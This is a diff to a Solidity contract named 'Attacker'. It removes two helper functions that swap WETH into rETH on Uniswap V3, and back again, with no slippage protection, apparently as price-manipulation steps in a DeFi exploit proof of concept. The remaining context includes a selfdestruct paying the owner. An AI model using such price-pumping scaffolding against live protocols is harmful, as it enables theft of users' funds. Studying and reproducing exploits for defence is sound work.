@@ -41,38 +41,5 @@ contract Attacker {
     selfdestruct(payable(OWNER));
   }
 
-  function _pumpRETH(uint256 _amount) internal {
-    WETH.deposit{ value: _amount }();
-    WETH.approve(UNISWAP_V3_ROUTER, _amount);
-    ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
-      ISwapRouter.ExactInputSingleParams({
-        tokenIn: address(WETH),
-        tokenOut: address(reth),
-        fee: 500,
-        recipient: address(this),
-        amountIn: _amount,
-        amountOutMinimum: 0,
-        sqrtPriceLimitX96: 0
-      })
-    );
-  }
-
-  function _swapRETHBack() internal {
-    uint256 balance = reth.balanceOf(address(this));
-    reth.approve(UNISWAP_V3_ROUTER, balance);
-    ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
-      ISwapRouter.ExactInputSingleParams({
-        tokenIn: address(reth),
-        tokenOut: address(WETH),
-        fee: 500,
-        recipient: address(this),
-        amountIn: balance,
-        amountOutMinimum: 0,
-        sqrtPriceLimitX96: 0
-      })
-    );
-    WETH.withdraw(WETH.balanceOf(address(this)));
-  }
-
   receive() external payable {}
 }
